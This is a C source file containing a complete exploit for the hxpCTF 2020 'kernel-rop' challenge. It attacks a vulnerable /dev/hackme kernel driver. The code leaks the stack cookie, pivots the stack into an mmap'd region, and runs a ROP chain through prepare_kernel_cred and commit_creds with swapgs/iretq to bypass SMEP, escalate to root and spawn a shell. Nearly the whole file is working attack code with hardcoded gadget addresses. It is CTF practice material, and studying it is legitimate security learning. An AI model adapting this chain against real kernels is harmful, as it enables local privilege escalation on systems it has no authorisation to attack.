// hxpCTF 2020 kernel-rop Exploit
// SMEP
// Stack pivot

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>

int device_fd;

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

void pwn(){
    puts("[*] Spawning shell on user land");
    uid_t uid = getuid();

    if (uid == 0){
        printf("[+] UID: %d, got root!");
    } else {
        printf("[-] UID: %d, could ot get root.");
        exit(-1);
    }

    system("/bin/sh");
}

unsigned long user_rip = (unsigned long) pwn;

void open_device(){
    device_fd = open("/dev/hackme", O_RDWR);
    if (device_fd < 0){
        puts("Failed to open /dev/hackme");
        exit(-1);
    } else {
        puts("Device /dev/hackme openned");
    }
}

unsigned long stack_cookie;
void get_stack_cookie(){
    // int tmp[32] has 32*4 of size = 128
    unsigned long stack[0x14]; // sizeof(unsigned long) = 8; 0x14 = 20
    // if stack cookie is right after tmp var in stack, stack cookie sould be in position position 16 of local stack array
    ssize_t r = read(device_fd, stack, sizeof(stack)); // 0x3a811aed457f8a00

    stack_cookie = stack[16];
    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Stack cookie: %lx\n", stack_cookie);

}

/* Functions Addresses */
unsigned long native_write_cr4 = 0xffffffff814443e0;
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
/* Functions Addresses */

/* Gadgets */
unsigned long xor_edi_call_rax = 0xffffffff8142c38c; // xor edi, edi ; mov r8, rdi ; call rax
unsigned long xor_edi_edi__mov_r8_rdi__call_rax = 0xffffffff8142c38c;
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long pop_rax_ret = 0xffffffff81004d11;
unsigned long iretq = 0xffffffff8100c0d9;

// 0xffffffff8100a55f : swapgs ; pop rbp ; ret
unsigned long swapgs__pop_rbp__ret = 0xffffffff8100a55f;

// 0xffffffff8166fea3 : mov rdi, rax ; jne 0xffffffff8166fe73 ; pop rbx ; pop rbp ; ret
unsigned long mov_rdi_rax__jne__pop_rbx__pop_rbp__ret = 0xffffffff8166fea3;

// 0xffffffff81007616 : pop rdx ; ret
unsigned long pop_rdx__ret = 0xffffffff81007616;

// 0xffffffff81964cc4 : cmp rdx, 8 ; jne 0xffffffff81964cb3 ; pop rbx ; pop rbp ; ret
unsigned long cmp_rdx_8__jne__pop_rbx_pop_rbp__ret = 0xffffffff81964cc4;

// 0xffffffff819f71d9 : mov esp, 0x5d5bffff ; ret
// unsigned long mov_esp__ret = 0xffffffff819f71d9; // Stack pivot

// 0xffffffff8196f56a : mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret
unsigned long mov_esp__pop_r12__pop_rbp__ret = 0xffffffff8196f56a;

/* Gadgets */

unsigned long *fake_stack;
void stack_frame(void){
    puts("[*] Trying to rewrite ret addr");

    fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);

    // Divided by 8 because of sizeof(unsigned int) = 8. So: 
    // 0x5b000000 - 0x1000 (0x5afff000): Stack top (512 unsigned int positions)
    // 0x1000 / 8 = 512, that's where our rop needs to be. Offset 512 of our 1024 unsigned int array positions.
    // So rsp will be point to 0x5b000000, exactly where the rop starts hex(512*8) = 0x1000. 
    unsigned off = 0x1000 / 8;

    // Load first page to prevent fault
    fake_stack[0] = 0x41424344;

    fake_stack[off++] = 0x0; // pop r12
    fake_stack[off++] = 0x0; // pop rbp

    // put 0 into rdi to be used as first argument of prepare_kernel_cred
    fake_stack[off++] = pop_rdi_ret;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = prepare_kernel_cred; // ret address

    // setting ZERO register for not trigger jne in next gadget
    // Putting 0x8 to rdx then comparing it.
    fake_stack[off++] = pop_rdx__ret;
    fake_stack[off++] = 0x8;
    fake_stack[off++] = cmp_rdx_8__jne__pop_rbx_pop_rbp__ret;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = 0x0;

    // put rax value into rdi (prepare_kernel_cred return value)
    fake_stack[off++] = mov_rdi_rax__jne__pop_rbx__pop_rbp__ret;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = 0x0;
    fake_stack[off++] = commit_creds;

    // execute swapgs
    fake_stack[off++] = swapgs__pop_rbp__ret;
    fake_stack[off++] = 0x0; // for pop rbp

    // Execute iretq and put all values for context swap into fake_stack
    fake_stack[off++] = iretq;
    fake_stack[off++] = user_rip;
    fake_stack[off++] = user_cs;
    fake_stack[off++] = user_rflags;
    fake_stack[off++] = user_sp;
    fake_stack[off++] = user_ss;

}

void overflow(void){

    unsigned long payload[50];
    memset(payload, 0x0, sizeof(unsigned long)*50);

    int off = 16;

    // Prepare real stack for rop
    payload[off++] = stack_cookie;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    // Write fake stack address to rsp
    payload[off++] = mov_esp__pop_r12__pop_rbp__ret;

    puts("[+] Writting payload...");
    write(device_fd, payload, sizeof(payload));

}

void save_registers_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;" // push lower 16 bits of EFLAGS Register Onto the Stack
        "pop user_rflags;" // put first stack value (eflags)
        ".att_syntax;"
    );
}

int main(){
    open_device();
    get_stack_cookie();
    save_registers_state();
    stack_frame();
    overflow();
}
// $rdi = 0xffffc90000193e08 → 0xffffc90000193ef0 → 0x0000000000000000
// $rsi = 0xffffffffc0002440 → 0x00000000004b2fe0 → 0x0000000000000000
// 0xffffc900001bfe08 stack addr